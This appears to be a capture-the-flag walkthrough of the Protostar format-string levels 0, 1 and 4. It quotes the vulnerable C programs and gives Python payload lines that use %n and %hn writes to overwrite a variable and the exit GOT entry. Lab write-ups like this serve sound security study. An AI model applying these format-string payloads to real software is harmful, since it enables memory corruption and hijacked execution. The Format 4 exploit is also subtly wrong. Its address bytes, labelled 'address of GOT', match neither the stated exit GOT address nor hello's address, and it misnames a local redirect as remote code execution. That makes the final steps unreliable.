# Protostar Format levels

## Format 0
For this level we have to exploit the following C code.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

These types of challenges require a deep understanding of printf. I recommend reading the `man printf` page, especially the format modifiers **%x, %n and adding to them, such as %100x and %4$x**

This challenge is similar to a buffer overflow attack, where we are required to override a value with a certain value. Clearly we can just enter 64 characters followed by 0xdeadbeef (split for *little endianness* ofcourse). However the challenge wants this done in less than 15 characters. 

The way we can do this is by using the format modifier `%64x`. This would adding 64 bytes of padding to our string, followed by 0xdeadbeef, this would result in 64 characters being printed. Like we need.

So let's generate our output with python
```python
print '%64x' + '\xef\xbe\xad\xde'
```

## Format 1

This challenges introduces the `%n` modifier, that allows us to write to any value in memory. Keep this idea in main, as it will allow us later to execture our own code.

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Firstly we can find the address of target using *objdump*
```
objdump -t program | grep target
```
This prints the address of target in memory -> **0x08049638**. Now that we have an address to overwrite, how do we do that?

Well first we need to find what offset our input string is on the stack for printf.
This can be found by AAAA %p %p.... %p a bunch of times. I find it is the 128th item on the stack

So let's generate a script. We need to put the address on the stack so:
```attack = "\x38\x96\x04\x08```

Now we need to set the variable, we can use %n for this. But we need the 128th item on the stack so we can use the $ modifier like
```attack += "%128$n"```
This will now overwrite the variable target, with with however many characters have already been written. (4 in this case).

## Format 4

Format levels 2-3 are very similar in that they explain slowly how to change a variable, how to set it to be a specific value. This level is all about moving from data being written, to arbritary code execution

Let's take a look at the C
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);   
}

int main(int argc, char **argv)
{
  vuln();
}
```

Before we start, just as before we should find the format string offset ($ modifier) so that we know we can reach our string in memory. 
To do this we will run the program with **"AAAA %p %p %p %p %p..."** until we see the hex value of AAAA (*0x41414141*) printed to the screen.

Doing this we find an offset of 4 paramaters. So **"AAAA %4$p"** prints `AAAA 0x414141`. Perfect.

Now, we know from earlier if we replace the p with an n in the above statement, it will write the amount of characters printed so far to the address "AAAA".
Our first step is to find an address to write to. This is where the Global Offset Table, and Dynamically Linked Libraries knowledge comes in handy.

http://grantcurell.com/2015/09/21/what-is-the-symbol-table-and-what-is-the-global-offset-table/ Is a really good link to understand how the GOT and PLT work.

Now that we understand what the GOT address is, we can notice that the program uses ```exit()``` to quit the program. Exit is a dynamically linked function. **So...** if we can overwrite the GOT address for exit, to instead point to our own function, then we could possibly have remote code execution.

Let's pop open gdb/objdump and find some addresses.

Using gdb to print the Global offset Table (x/64i exit). We can find the address of exit
**exit** = *0x08049724*

Similarly we can find the address of *hello* which is *0x080484b4*

We can confirm that this is the correct address of exit by using our earlier string **"AAAA %4$p"**, replacing AAAA with the address, and $p with $n.
Hopefully the program will crash instead of exiting..

```python
print '\xb4\x84\x40\x80' + ' %4$n'
```
This should hopefully overwrite the GOT entry with `5`, and then crash the program.
Running in GDB shows the following result:
`Segmentation fault: 0x00000005 in ?? ()`
Success!!!

Now from observation we can see that our address, and the GOT address are very similar, in fact only the last 4 bytes are different.

So let's start writing up our exploit. We can begin with the address, and then a padding of 0x84b4 and then our %4$hn, hn means only write half the word or 2 bytes of data. This saves us from having to overwrite the entire number, which would require 0x080484b4 characters, or.. 67404980 characters..

```python
attack = "\xb4\x84\x40\x80" #address of GOT
attack += "%" + str(0x84b4) + "x" #%x buffer to set how many characters to print
attack += "%4$hn" #Write how many characters have been printed so far, into the second half of the address
print attack
```

Win!